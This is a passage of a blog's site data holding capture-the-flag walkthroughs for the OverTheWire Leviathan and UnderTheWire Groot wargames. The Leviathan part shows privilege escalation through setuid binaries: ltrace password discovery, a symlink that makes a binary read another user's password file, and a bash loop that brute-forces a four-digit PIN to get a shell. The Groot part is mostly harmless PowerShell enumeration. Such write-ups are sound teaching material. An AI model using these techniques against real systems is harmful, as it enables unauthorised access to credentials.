\u0026quot;h0no33\u0026quot; and \u0026quot;kakaka\u0026quot; — since they\u0026rsquo;re not equal, strcmp() returns -1.\nprintf(\u0026quot;Enter the password\u0026gt; \u0026quot;) = 20\nThe program prints the prompt:\nEnter the password\u0026gt; The return value 20 is the number of characters printed.\nfgets(\u0026quot;mnnnwenw\\n\u0026quot;, 256, 0xf7fab5c0) = 0xffffd1fc\nThis shows the program reads your input (mnnnwenw followed by a newline). It reads up to 256 bytes, and stores it in memory. The input includes the newline (\\n) because fgets() does not strip it. strcmp(\u0026quot;mnnnwenw\\n\u0026quot;, \u0026quot;snlprintf\\n\u0026quot;) = -1\nNow the program compares what you typed with the expected password (snlprintf\\n).\nSince they\u0026rsquo;re different, the return value is -1 — meaning the password is incorrect.\nputs(\u0026quot;bzzzzzzzzap. WRONG\u0026quot;)\nThe program prints:\nbzzzzzzzzap. WRONG because your input did not match the expected password.\n+++ exited (status 0) +++\nThe program exits normally (exit code 0), even though the password was wrong.\nwe now have the password for the binary snlprintf\nleviathan3@leviathan:~$ ./level3 Enter the password\u0026gt; snlprintf [You\u0026#39;ve got shell]! $ whoami leviathan4 $ cat /etc/leviathan_pass/leviathan4 [REDACTED] $ Leviathan 4-5 # For this challenge, we have an interesting folder just like for level 0 as shown below.\nleviathan4@leviathan:~$ ls -la total 24 drwxr-xr-x 3 root root 4096 Jul 28 19:05 . drwxr-xr-x 150 root root 4096 Jul 28 19:06 .. -rw-r--r-- 1 root root 220 Mar 31 2024 .bash_logout -rw-r--r-- 1 root root 3851 Jul 28 18:47 .bashrc -rw-r--r-- 1 root root 807 Mar 31 2024 .profile dr-xr-x--- 2 root leviathan4 4096 Jul 28 19:05 .trash Looking into the directory, we find an interesting binary file as shown below that when executed, it outputs a binary code.\nleviathan4@leviathan:~$ cd .trash leviathan4@leviathan:~/.trash$ ls bin leviathan4@leviathan:~/.trash$ ls -la total 24 dr-xr-x--- 2 root leviathan4 4096 Jul 28 19:05 . drwxr-xr-x 3 root root 4096 Jul 28 19:05 .. -r-sr-x--- 1 leviathan5 leviathan4 14940 Jul 28 19:05 bin leviathan4@leviathan:~/.trash$ ./bin 00110000 01100100 01111001 01111000 01010100 00110111 01000110 00110100 01010001 01000100 00001010 We shall use an online decryption tool like cyberchef to decode the message. Upon decryption, we get the password for the next level.\nLeviathan 5-6 # Looking at the home directory, we yet have another binary file to explore. We shall start first by executing it to see what happens\nleviathan5@leviathan:~$ ls -a . .. .bash_logout .bashrc leviathan5 .profile leviathan5@leviathan:~$ ./leviathan5 Cannot find /tmp/file.log leviathan5@leviathan:~$ As seen above the binary file is looking for a file called file.log in the temporary directory, which seems cannot be found. We shall look at the library calls being made to see if we can find anything of interest to us.\nleviathan5@leviathan:~$ ltrace ./leviathan5 __libc_start_main(0x804910d, 1, 0xffffd414, 0 \u0026lt;unfinished ...\u0026gt; fopen(\u0026#34;/tmp/file.log\u0026#34;, \u0026#34;r\u0026#34;) = 0 puts(\u0026#34;Cannot find /tmp/file.log\u0026#34;Cannot find /tmp/file.log ) = 26 exit(-1 \u0026lt;no return ...\u0026gt; +++ exited (status 255) +++ __libc_start_main(0x804910d, 1, 0xffffd414, 0 \u0026lt;unfinished ...\u0026gt;)\nThis is the start of the program. It sets up the environment and then calls main() (located at 0x804910d).\nfopen(\u0026quot;/tmp/file.log\u0026quot;, \u0026quot;r\u0026quot;) = 0\nThe program tries to open the file /tmp/file.log in read mode (\u0026quot;r\u0026quot;).\nReturn value 0 means failure — fopen() returns NULL when it can\u0026rsquo;t open a file. This could be because: The file does not exist. The user doesn\u0026rsquo;t have read permissions. It\u0026rsquo;s a broken symlink, or other file system error. puts(\u0026quot;Cannot find /tmp/file.log\u0026quot;) = 26\nSince the file couldn’t be opened, the program prints an error message:\nCannot find /tmp/file.log puts() returns the number of characters printed — 26 in this case.\nexit(-1 \u0026lt;no return ...\u0026gt;\nThe program immediately exits with status -1.\n+++ exited (status 255) +++\nBecause exit codes are unsigned 8-bit integers, exit(-1) becomes 255 (i.e., -1 \u0026amp; 0xFF).\nSo the program exits with status 255, indicating an error condition.\nFrom the above breakdown, we can create a symbolic link with the file and /etc/leviathan_pass/leviathan6 such that, when we execute the binary, we get the password for level 6.\nleviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log leviathan5@leviathan:~$ ./leviathan5 [REDACTED] leviathan5@leviathan:~$ We now have the password for the next level 🙂\nLeviathan 6-7 # For this level, we have a binary that requires a four digit pin in order for us to get a shell as shown below.\nleviathan6@leviathan:~$ ls -la total 36 drwxr-xr-x 2 root root 4096 Jul 28 19:05 . drwxr-xr-x 150 root root 4096 Jul 28 19:06 .. -rw-r--r-- 1 root root 220 Mar 31 2024 .bash_logout -rw-r--r-- 1 root root 3851 Jul 28 18:47 .bashrc -r-sr-x--- 1 leviathan7 leviathan6 15036 Jul 28 19:05 leviathan6 -rw-r--r-- 1 root root 807 Mar 31 2024 .profile leviathan6@leviathan:~$ ./leviathan6 usage: ./leviathan6 \u0026lt;4 digit code\u0026gt; leviathan6@leviathan:~$ To solve this one, we shall use a script to automate the process and get our shell.\n#!/bin/bash for a in {0000..9999} do ~/leviathan6 $a done 🔹#!/bin/bash\nThis is the shebang — it tells the system to run this script using the Bash shell.\n🔹 for a in {0000..9999}\nThis is a loop that iterates over all numbers from 0000 to 9999.\n{0000..9999} is Bash\u0026rsquo;s brace expansion. It expands into all 4-digit numbers (with leading zeros). So a will take values: 0000, 0001, 0002, \u0026hellip;, 9999. 🔹 ~/leviathan6 $a\nThis runs the binary leviathan6 in the user\u0026rsquo;s home directory with the current number ($a) as an argument.\nExample commands:\n~/leviathan6 0000 ~/leviathan6 0001 ... ~/leviathan6 9999 So it\u0026rsquo;s attempting every 4-digit PIN/password.\nAfter the script gets a pin, a shell will pop as seen below.\nWrong Wrong Wrong Wrong Wrong Wrong Wrong Wrong Wrong Wrong Wrong $ whoami leviathan7 $ cat /etc/leviathan_pass/leviathan7 [REDACTED] $ Leviathan 7 # With the password we got from level 6, we can use it to log in to level 7 and get to complete the challenge. After log in, we are provided with a congratulations note and we are done with the challenge.\nleviathan7@leviathan:~$ ls CONGRATULATIONS leviathan7@leviathan:~$ cat CONGRATULATIONS Well Done, you seem to have used a *nix system before, now try something more serious. We are done, we shall move on to the next challenge.\n","date":"26 July 2025","externalUrl":null,"permalink":"/posts/leviathan/","section":"Posts","summary":"overthewire wargames leviathan series","title":"overthewire leviathan war games","type":"posts"},{"content":"","date":"26 July 2025","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"26 July 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"26 July 2025","externalUrl":null,"permalink":"/","section":"v1c70r_n00b'$ Blog ⚔︎⛊","summary":"","title":"v1c70r_n00b'$ Blog ⚔︎⛊","type":"page"},{"content":"","date":"11 June 2025","externalUrl":null,"permalink":"/categories/ad/","section":"Categories","summary":"","title":"AD","type":"categories"},{"content":"","date":"11 June 2025","externalUrl":null,"permalink":"/tags/event-logs/","section":"Tags","summary":"","title":"Event Logs","type":"tags"},{"content":"","date":"11 June 2025","externalUrl":null,"permalink":"/tags/powershell/","section":"Tags","summary":"","title":"Powershell","type":"tags"},{"content":"","date":"11 June 2025","externalUrl":null,"permalink":"/tags/ssh/","section":"Tags","summary":"","title":"SSH","type":"tags"},{"content":"","date":"11 June 2025","externalUrl":null,"permalink":"/categories/underthewire/","section":"Categories","summary":"","title":"Underthewire","type":"categories"},{"content":" Groot level 0-1 # The goal of this challenge is for us to log in using the credentials provided to us in the Slack channel.\nThe goal of this level is to log into the game. Do the following in order to achieve this goal. 1. Obtain the initial credentials via the #StartHere channel on our Slack (link). Once you are in the channel, scroll to the top to see the credentials. 2. After obtaining the credentials, connect to the server via SSH. You will need an SSH client such as Putty. The host that you will be connecting to is groot.underthewire.tech, on port 22. 3. When prompted, use the credentials for the applicable game found in the #StartHere Slack channel. 4. You have successfully connected to the game server when your path changes to “PS C:\\Users\\Groot1\\desktop\u0026gt;”. After getting the credentials, we can then use them to log in via ssh as shown below, is the terminal of the instance after successful log in to the challenge.\nWindows PowerShell Copyright (C) 2016 Microsoft Corporation. All rights reserved. Under the Wire... PowerShell Training for the People! PS C:\\users\\Groot1\\desktop\u0026gt; Groot level 1-2 # The objective of this challenge, is to find the md5 hash of the system’s host file and use the last five alphanumeric characters as the password for level 2.\nThe password for groot2 is the last five alphanumeric characters of the MD5 hash of this system’s hosts file. NOTE: – The password will be lowercase no matter how it appears on the screen. IMPORTANT: Once you feel you have completed the Groot1 challenge, start a new connection to the server, and log in with the username of Groot2 and this password will be the answer from Groot1. If successful, close out the Groot1 connection and begin to solve the Groot2 challenge. This concept is repeated over and over until you reach the end of the game. We shall use the command below.\nget-filehash -algorithm md5 C:\\Windows\\System32\\ drivers\\etc\\hosts Below is the breakdown of the command used.\nGet-FileHash\nA PowerShell cmdlet that computes the hash value for a file Used for file integrity checking and verification Algorithm MD5\nSpecifies the MD5 hashing algorithm (128-bit hash value) Alternatives include SHA1, SHA256, SHA384, SHA512, etc. C:\\Windows\\System32\\drivers\\etc\\hosts\nThe path to the Windows hosts file This plaintext file maps hostnames to IP addresses before DNS lookup Here is the output of the command.\nPS C:\\users\\Groot1\\desktop\u0026gt; get-filehash -algorithm md5 C:\\Windows\\System32\\ drivers\\etc\\hosts Algorithm Hash --------- ---- MD5 [REDACTED] PS C:\\users\\Groot1\\desktop\u0026gt; After getting the hash, we can now use the last alphanumeric characters as our password for the next level.\nGroot level 2-3 # For this level, we are required to find the word that is made up of letters in the range of 1,481,110 to 1,481,117\nThe password for groot3 is the word that is made up from the letters in the range of 1,481,110 to 1,481,117 within the file on the desktop. NOTE: – The password will be lowercase no matter how it appears on the screen. Since the host key has already been added to the known hosts list, we do not need an additional option. Below is the command we shall use.\n(gc .\\elements.txt)[1481110..1481117] -join \u0026#34;\u0026#34; Below is the break-down of the command.\ngc .\\elements.txt\ngc is the alias for Get-Content Reads the content of elements.txt in the current directory Returns the file\u0026rsquo;s content as an array of characters (since PowerShell treats strings as character arrays) [1481110..1481117]\nExtracts characters at index positions 1,481,110 through 1,481,117 PowerShell uses zero-based indexing, so these are the 1,481,111th to 1,481,118th characters The .. Creates a range of indices join \u0026quot;\u0026quot;\nCombines the 8 selected characters into a single string The empty quotes \u0026quot;\u0026quot; specify no separator between characters Here is the output of the command used.\nPS C:\\users\\Groot2\\desktop\u0026gt; (gc .\\elements.txt)[1481110..1481117] -join \u0026#34;\u0026#34; [REDACTED] PS C:\\users\\Groot2\\desktop\u0026gt; With that, we have the password for our next level.\nGroot level 3-4 # In this challenge, we are required to find the number of times the word beetle is listed in the file on the desktop.\nThe password for groot4 is the number of times the word “beetle” is listed in the file on the desktop. We shall use the following command.\n(type \u0026#34;.\\words.txt\u0026#34;).split(\u0026#39; \u0026#39;) -like \u0026#34;beetle\u0026#34; | measure-object Below is a breakdown of the command.\ntype \u0026quot;.\\words.txt\u0026quot;\ntype is an alias for Get-Content Reads the content of \u0026ldquo;words.txt\u0026rdquo; in the current directory Equivalent to Get-Content \u0026quot;.\\words.txt\u0026quot; .split(' ')\nSplits the file content into an array of words using space as the delimiter Note: This simple splitting may not handle all cases (like punctuation or multiple spaces) like \u0026quot;beetle\u0026quot;\nFilters the array to only include elements that match \u0026ldquo;beetle\u0026rdquo; like allows wildcard matching (though not used here) | measure-object\nCounts the number of items that passed the filter Returns an object with count, average, sum, etc. (though only count is relevant here) Here is the output of the command.\nPS C:\\users\\Groot3\\desktop\u0026gt; (type \u0026#34;.\\words.txt\u0026#34;).split(\u0026#39; \u0026#39;) -like \u0026#34;beetle\u0026#34; | measure-object Count : [REDACTED] Average : Sum : Maximum : Minimum : Property : Groot level 4-5 # Below is the objective of the challenge.\nThe password for groot5 is the name of the Drax subkey within the HKEY_CURRENT_USER (HKCU) registry hive. NOTE: – The password will be lowercase no matter how it appears on the screen. We are required to find the name of drax subkey within the HKCU registry hive.\nBelow is the command we shall use for this challenge.\nget-childitem -path hkcu:\\ -recurse -erroraction silentlycontinue | select-string drax Here is the breakdown of the command.\nGet-ChildItem -Path HKCU:\\\nLists items in the HKEY_CURRENT_USER (HKCU) registry hive HKCU:\\ is the PowerShell drive representing the current user\u0026rsquo;s registry settings Recurse\nSearches through all subkeys recursively (entire registry tree under HKCU) ErrorAction SilentlyContinue\nSuppresses permission errors when accessing protected registry keys Prevents the command from stopping if it hits keys it can\u0026rsquo;t access | Select-String drax\nPipes the registry contents to search for the string \u0026ldquo;drax\u0026rdquo; Looks for \u0026ldquo;drax\u0026rdquo; in: Key names Property names Property values (both names and data) Below is the output of the command.\nPS C:\\users\\Groot4\\desktop\u0026gt; get-childitem -path hkcu:\\ -recurse -erroraction silentlycontinue | select-string drax HKEY_CURRENT_USER\\Software\\Microsoft\\Assistance\\Drax HKEY_CURRENT_USER\\Software\\Microsoft\\Assistance\\Drax\\[REDACTED] PS C:\\users\\Groot4\\desktop\u0026gt; We now have the password for the next level.\nGroot level 5-6 # For this challenge, we are required to find the name of the workstation for the user baby.groot then combine it with the name of the file on the desktop of the user groot5.\nThe password for groot6 is the name of the workstation that the user with a username of “baby.groot” can log into as depicted in Active Directory PLUS the name of the file on the desktop NOTE: – If the workstation is “system1” and the file on the desktop is named “_log”, the password would be “system1_log”. – The password will be lowercase no matter how it appears on the screen. Below is the target file on desktop.\nWindows PowerShell Copyright (C) 2016 Microsoft Corporation. All rights reserved. Under the Wire... PowerShell Training for the People! PS C:\\users\\Groot5\\desktop\u0026gt; ls Directory: C:\\users\\Groot5\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 9/20/2020 3:38 PM 0 _enterprise To find the name of the workstation of the ad user baby.groot , we shall use the command below.\n(get-aduser baby.groot -properties * ).userWorkstations Below is the breakdown of the command.\nGet-ADUser baby.groot\nRetrieves the Active Directory user object for account \u0026ldquo;baby.groot\u0026rdquo; Basic version only returns default properties (name, SAM account, SID, etc.) Properties *\nRequests ALL properties of the user object (not just default ones) Required because userWorkstations isn\u0026rsquo;t among default returned properties .userWorkstations\nAccesses the specific userWorkstations attribute from the returned object This attribute specifies which computers the user can log into (by NetBIOS name) Below is the output of the command.\nPS C:\\users\\Groot5\\desktop\u0026gt; (get-aduser baby.groot -properties * ).userWorkstations [REDACTED] PS C:\\users\\Groot5\\desktop\u0026gt; Groot level 6-7 # For this challenge, we need to find the name of the program that is set to run when this user logs in, then join it with the name of the file on the desktop.\nThe password for groot7 is the name of the program that is set to start when this user logs in PLUS the name of the file on the desktop. NOTE: – Omit the executable extension. – If the program is “mspaint” and the file on the desktop is named “_log”, the password would be “mspaint_log”. – The password will be lowercase no matter how it appears on the screen. Below is the file on the desktop.\nPS C:\\users\\Groot6\\desktop\u0026gt; ls Directory: C:\\users\\Groot6\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/21/2020 1:24 PM 0 _rules PS C:\\users\\Groot6\\desktop\u0026gt; To find the name of the program that runs when the user logs in, we shall use the command shown below, which is very similar with the command we used on groot7.\nget-WmiObject Win32_StartupCommand | Select-Obje ct Name, command, Location, User | Format-List Below is the breakdown.\nGet-WmiObject Win32_StartupCommand\nQueries WMI (Windows Management Instrumentation) for startup commands The Win32_StartupCommand class contains entries for: Programs in Startup folders Registry Run keys (HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run) Other auto-start locations | Select-Object Name, Command, Location, User\nFilters the output to show only these specific properties: Name: Display name of the startup item Command: Actual executable/command that runs Location: Where the startup entry is configured User: Which user account the startup applies to (if user-specific) | Format-List\nDisplays the results in list format (one property per line) Alternative to table view (Format-Table), better for readability with long values Below is the output of the command.\nPS C:\\users\\Groot6\\desktop\u0026gt; get-WmiObject Win32_StartupCommand | Select-Obje ct Name, command, Location, User | Format-List Name : New Value #1 command : Location : HKU\\S-1-5-21-758131494-606461608-3556270690-1169\\SOFTWARE\\Micros oft\\Windows\\CurrentVersion\\Run User : underthewire\\Groot6 Name : New Value #2 command : Location : HKU\\S-1-5-21-758131494-606461608-3556270690-1169\\SOFTWARE\\Micros oft\\Windows\\CurrentVersion\\Run User : underthewire\\Groot6 Name : New Value #3 command : Location : HKU\\S-1-5-21-758131494-606461608-3556270690-1169\\SOFTWARE\\Micros oft\\Windows\\CurrentVersion\\Run User : underthewire\\Groot6 Name : New Value #4 command : Location : HKU\\S-1-5-21-758131494-606461608-3556270690-1169\\SOFTWARE\\Micros oft\\Windows\\CurrentVersion\\Run User : underthewire\\Groot6 Name : [REDACTED] command : C:\\star-lord.exe Location : HKU\\S-1-5-21-758131494-606461608-3556270690-1169\\SOFTWARE\\Micros oft\\Windows\\CurrentVersion\\Run User : underthewire\\Groot6 PS C:\\users\\Groot6\\desktop\u0026gt; And with that, we have our password.\nGroot level 7-8 # For this challenge, we are required to find the name of dll as depicted in the registry, associated with the applockerfltr service then join it with the name of the file on the desktop in order to get the password for the next level.\nThe password for groot8 is the name of the dll, as depicted in the registry, associated with the “applockerfltr” service PLUS the name of the file on the desktop. NOTE: – The password will be lowercase no matter how it appears on the screen. – If the name of the dll is “abc.dll” and the file on the desktop is named “_1234”, the password would be “abc_1234”. Below is the name of the files located on the desktop.\nPS C:\\users\\Groot7\\desktop\u0026gt; ls Directory: C:\\users\\Groot7\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 5/31/2021 5:13 PM 0 _home PS C:\\users\\Groot7\\desktop\u0026gt; We shall use the command below to find the name of the dll.\n(Get-ChildItem \u0026#39;HKLM:\\SYSTEM\\CurrentControlSet\\S ervices\u0026#39; | Where-Object {$_.Name -like \u0026#39;*applocker*\u0026#39;} | Get-ItemProperty -Na me DisplayName).DisplayName.Split(\u0026#39;\\\\\u0026#39;)[-1].Split(\u0026#39;\\.\u0026#39;)[0] Get-ChildItem 'HKLM:\\SYSTEM\\CurrentControlSet\\Services'\nLists all subkeys under the Windows services registry location This is where all system services are registered | Where-Object {$_.Name -like '*applocker*'}\nFilters to only show services with \u0026ldquo;applocker\u0026rdquo; in their name (case-insensitive) The wildcards () mean it can appear anywhere in the name| Get-ItemProperty -Name DisplayName Retrieves the DisplayName property from each matching service This is the human-readable service name shown in services.msc .DisplayName.Split('\\\\')[-1]\nTakes the DisplayName string and splits it by backslashes (\\) [-1] selects the last element after splitting .Split('\\.')[0]\nFurther splits the result by a period (.) [0] selects the first part before any period In windows, registered services can be found under HKLM:\\SYSTEM\\CurrentControlSet\\Services\nBelow is the output of the command.\nPS C:\\users\\Groot7\\desktop\u0026gt; (Get-ChildItem \u0026#39;HKLM:\\SYSTEM\\CurrentControlSet\\S ervices\u0026#39; | Where-Object {$_.Name -like \u0026#39;*applocker*\u0026#39;} | Get-ItemProperty -Na me DisplayName).DisplayName.Split(\u0026#39;\\\\\u0026#39;)[-1].Split(\u0026#39;\\.\u0026#39;)[0] [REDACTED] PS C:\\users\\Groot7\\desktop\u0026gt; Groot level 8-9 # For this level, we are required to find the description of the firewall rule that blocks MYSQL and join it with the name of the file on the desktop.\nThe password for groot9 is the description of the firewall rule blocking MySQL PLUS the name of the file on the desktop. NOTE: – If the description of the rule is “blue” and the file on the desktop is named “_bob”, the password would be “blue_bob”. – The password will be lowercase no matter how it appears on the screen. Below is the file on the desktop.\nPS C:\\users\\Groot8\\desktop\u0026gt; ls Directory: C:\\users\\Groot8\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 10:51 AM 0 _starlord PS C:\\users\\Groot8\\desktop\u0026gt; To find the description of the firewall rule, we shall use the following command.\nGet-NetFirewallRule -Action Block | Where-Object {$_.DisplayName -like \u0026#39;*mysql*\u0026#39;} Below is the breakdown of the command.\nGet-NetFirewallRule -Action Block\nRetrieves all Windows Firewall rules that have an action of \u0026ldquo;Block\u0026rdquo; Part of the NetSecurity module (built into modern Windows) Without parameters, it would return all firewall rules (allow and block) | (Pipeline)\nSends the firewall rules to the next command for filtering Where-Object {$_.DisplayName -like '*mysql*'}\nFilters the rules to only show those with \u0026ldquo;mysql\u0026rdquo; in their display name like with wildcards () makes the search case-insensitive $_ represents each firewall rule as it comes through the pipeline Below is the output of the command.\nPS C:\\users\\Groot8\\desktop\u0026gt; Get-NetFirewallRule -Action Block | Where-Object {$_.DisplayName -like \u0026#39;*mysql*\u0026#39;} Name : {8ce6b97d-5c1d-4347-a7fd-1792feb42355} DisplayName : MySQL Description :[REDACTED] DisplayGroup : Group : Enabled : True Profile : Any Platform : {} Direction : Inbound Action : Block EdgeTraversalPolicy : Block LooseSourceMapping : False LocalOnlyMapping : False Owner : PrimaryStatus : OK Status : The rule was parsed successfully from the store. (65536) EnforcementStatus : NotApplicable PolicyStoreSource : PersistentStore PolicyStoreSourceType : Local PS C:\\users\\Groot8\\desktop\u0026gt; Groot level 9-10 # For this level we need to find the name of the OU that doesn’t have accidental deletion protection enabled, then join it with the name of the file on the desktop.\nThe password for groot10 is the name of the OU that doesn’t have accidental deletion protection enabled PLUS the name of the file on the desktop. NOTE: – If the name of the OU is called “blue” and the file on the desktop is named “_bob”, the password would be “blue_bob”. – The password will be lowercase no matter how it appears on the screen. Below is the name of the file on the desktop.\nPS C:\\users\\Groot9\\desktop\u0026gt; ls Directory: C:\\users\\Groot9\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 10:51 AM 0 _tester PS C:\\users\\Groot9\\desktop\u0026gt; To find the OU (Organizational unit), we shall use the command below.\nGet-ADOrganizationalUnit -Filter * -Properties ProtectedFromAccidentalDeletion | Where-Object {-not $_.ProtectedFromAccidentalDeletion} Below is the breakdown of the command.\nGet-ADOrganizationalUnit -Filter *\nRetrieves all Organizational Units (OUs) from Active Directory Filter * means \u0026ldquo;no filter\u0026rdquo; (get all OUs) Properties ProtectedFromAccidentalDeletion\nIncludes the ProtectedFromAccidentalDeletion property in the results This property isn\u0026rsquo;t returned by default, so we explicitly request it | Where-Object {-not $_.ProtectedFromAccidentalDeletion}\nFilters the OUs to only show those where protection is NOT enabled not inverts the boolean value (selects false values) $_ represents each OU as it comes through the pipeline Below is the output of the command.\nPS C:\\users\\Groot9\\desktop\u0026gt; Get-ADOrganizationalUnit -Filter * -Properties P rotectedFromAccidentalDeletion | Where-Object {-not $_.ProtectedFromAccident alDeletion} City : Country : DistinguishedName : OU=T-25,OU=X-Wing,DC=underthewire,DC=tech LinkedGroupPolicyObjects : {cn={49401C32-4145-463F-B5E7-816926D4F78D },cn=policies,cn=system,DC=underthewire,D C=tech} ManagedBy : Name : [REDACTED] ObjectClass : organizationalUnit ObjectGUID : fc15c303-dd9a-4c44-a941-314cc6fdd394 PostalCode : ProtectedFromAccidentalDeletion : False State : StreetAddress : PS C:\\users\\Groot9\\desktop\u0026gt; We now have our password for level 10\nGroot level 10-11 # For this level, we are required to find the word is different from the other file on the desktop. In short we are required to find a cmdlet that functions as the diff command in linux which in our case is Compare-Object.\nThe password for groot11 is the one word that makes the two files on the desktop different. NOTE: – The password will be lowercase no matter how it appears on the screen. The files on the desktop are as shown below.\nPS C:\\users\\Groot10\\desktop\u0026gt; ls Directory: C:\\users\\Groot10\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 5:52 AM 17324 new.txt -a---- 8/30/2018 5:52 AM 17313 old.txt PS C:\\users\\Groot10\\desktop\u0026gt; Here is how we shall solve the problem.\ncompare-object (gc .\\old.txt) (gc .\\new.txt) Below is the nreakdown of the command.\nGet-Content .\\old.txt (abbreviated as gc .\\old.txt)\nReads the content of old.txt line by line Returns an array of strings (each line becomes an array element) Get-Content .\\new.txt (abbreviated as gc .\\new.txt)\nReads the content of new.txt line by line Returns another array of strings Compare-Object\nCompares the two collections (arrays of lines from each file) Shows which lines are unique to each file The output indicates whether each difference appears in the \u0026ldquo;Reference\u0026rdquo; set (first file) or \u0026ldquo;Difference\u0026rdquo; set (second file) Below is the output of the command.\nPS C:\\users\\Groot10\\desktop\u0026gt; compare-object (gc .\\old.txt) (gc .\\new.txt) InputObject SideIndicator ----------- ------------- [REDACTED] =\u0026gt; PS C:\\users\\Groot10\\desktop\u0026gt; Groot level 11-12 # For this level, we are told the password is somewhere in the alternate data stream on the desktop, meaning we have to find a way of referencing all the data streams of the files on the desktop.\nThe password for groot12 is within an alternate data stream (ADS) somewhere on the desktop. NOTE: – The password will be lowercase no matter how it appears on the screen. Below are the files on the desktop of the user.\nPS C:\\users\\Groot11\\desktop\u0026gt; ls Directory: C:\\users\\Groot11\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 5:52 AM 30 TPS_Reports01.txt -a---- 8/30/2018 5:52 AM 30 TPS_Reports02.doc -a---- 8/30/2018 5:52 AM 0 TPS_Reports03.txt -a---- 8/30/2018 10:51 AM 30 TPS_Reports04.pdf -a---- 8/30/2018 5:52 AM 30 TPS_Reports05.xlsx -a---- 8/30/2018 5:52 AM 30 TPS_Reports06.pptx PS C:\\users\\Groot11\\desktop\u0026gt; To check the data streams of all the files, we shall use the command below.\ngci -File | gi -Stream * | select-object FileNa me,Stream Below is the breakdown of the command.\nGet-ChildItem -File (abbreviated as gci -File)\nLists all files (not directories) in the current folder The File switch ensures only files are returned, not folders | Get-Item -Stream * (abbreviated as | gi -Stream *)\nPipes the files to examine their alternate data streams Stream * retrieves information about ALL streams (not just the main data stream) This includes hidden streams like Zone.Identifier (used for downloaded files) | Select-Object FileName, Stream\nFilters the output to show only: FileName: The name of the file Stream: The name of the alternate data stream Below is the output of the command.\nPS C:\\users\\Groot11\\desktop\u0026gt; gci -File | gi -Stream * | select-object FileNa me,Stream FileName Stream -------- ------ C:\\users\\Groot11\\desktop\\TPS_Reports01.txt :$DATA C:\\users\\Groot11\\desktop\\TPS_Reports02.doc :$DATA C:\\users\\Groot11\\desktop\\TPS_Reports03.txt :$DATA C:\\users\\Groot11\\desktop\\TPS_Reports04.pdf :$DATA C:\\users\\Groot11\\desktop\\TPS_Reports04.pdf secret C:\\users\\Groot11\\desktop\\TPS_Reports05.xlsx :$DATA C:\\users\\Groot11\\desktop\\TPS_Reports06.pptx :$DATA PS C:\\users\\Groot11\\desktop\u0026gt; After getting the stream, we can now get the entire stream as a single stream as shown below.\nGet-Content C:\\users\\Groot11\\desktop\\TPS_Reports04.pdf -Raw -Stream secret Get-Content\nPowerShell cmdlet for reading file contents C:\\users\\Groot11\\desktop\\TPS_Reports04.pdf\nSpecifies the path to a PDF file on user Groot11\u0026rsquo;s desktop The file appears to be named \u0026ldquo;TPS_Reports04.pdf\u0026rdquo; (possibly a reference to Office Space movie) Raw\nReads the entire stream as a single string Without this, it would return line-by-line output Stream secret\nAttempts to access an alternate data stream named \u0026ldquo;secret\u0026rdquo; This is a hidden stream attached to the file (NTFS feature) Here is the output of the command\nPS C:\\users\\Groot11\\desktop\u0026gt; Get-Content C:\\users\\Groot11\\desktop\\TPS_Report s04.pdf -Raw -Stream secret [REDACTED] PS C:\\users\\Groot11\\desktop\u0026gt; Groot level 12-13 # For this challenge, we have to find the owner of the folder Nine Realms located on the desktop in order to find the password for the next level.\nThe password for groot13 is the owner of the Nine Realms folder on the desktop. NOTE: – Exclude the Administrator, the Administrators group, and System. – The password will be lowercase with no punctuation no matter how it appears on the screen. For example, if the owner is “john.doe”, it would be “johndoe”. Below is the command we shall use to get the owner of the folder\nget-acl \u0026#39;.\\Nine Realms\u0026#39; Get-Acl\nThe PowerShell cmdlet that retrieves security descriptors (permission information) Stands for \u0026ldquo;Get Access Control List\u0026rdquo; '.\\Nine Realms'\nSpecifies the target path (a folder or file named \u0026ldquo;Nine Realms\u0026rdquo;) .\\ indicates the current directory The single quotes allow for spaces in the name Below is the output of the command\nPS C:\\users\\Groot12\\desktop\u0026gt; get-acl \u0026#39;.\\Nine Realms\u0026#39; Directory: C:\\users\\Groot12\\desktop Path Owner Access ---- ----- ------ Nine Realms underthewire\\[REDACTED] NT AUTHORITY\\SYSTEM Allow FullControl... Groot level 13-14 # For this level, we are required to find the name of the registered owner of this system, then combine with the name of the file on the desktop.\nThe password for groot14 is the name of the Registered Owner of this system as depicted in the Registry PLUS the name of the file on the desktop. NOTE: – If the Registered Owner is “Elroy” and the file on the desktop is named “_bob”, the password would be “elroy_bob”. – The password will be lowercase no matter how it appears on the screen. Below is the file located on the desktop.\nPS C:\\users\\Groot13\\desktop\u0026gt; ls Directory: C:\\users\\Groot13\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 10:51 AM 0 _ned PS C:\\users\\Groot13\\desktop\u0026gt; To find the name of the registered owner of this system, we shall check the registry HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion using the command below.\nGet-Item \u0026#39;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\u0026#39; What this command does is\nGet-Item\nPowerShell cmdlet that retrieves information about items (files, folders, registry keys) When used with registry paths, it gets registry key information 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion'\nSpecifies the registry path to examine HKLM: = HKEY_LOCAL_MACHINE hive (physical machine settings) This specific path contains Windows version and installation information Below is the output of the command.\nPS C:\\users\\Groot13\\desktop\u0026gt; get-item \u0026#39;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\C urrentVersion\u0026#39; Hive: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT Name Property ---- -------- CurrentVersion SystemRoot : C:\\Windows BuildBranch : rs1_release BuildGUID : ffffffff-ffff-ffff-ffff-ffffffffffff BuildLab : 14393.rs1_release.250210-1748 BuildLabEx : 14393.7870.amd64fre.rs1_release.250210-1748 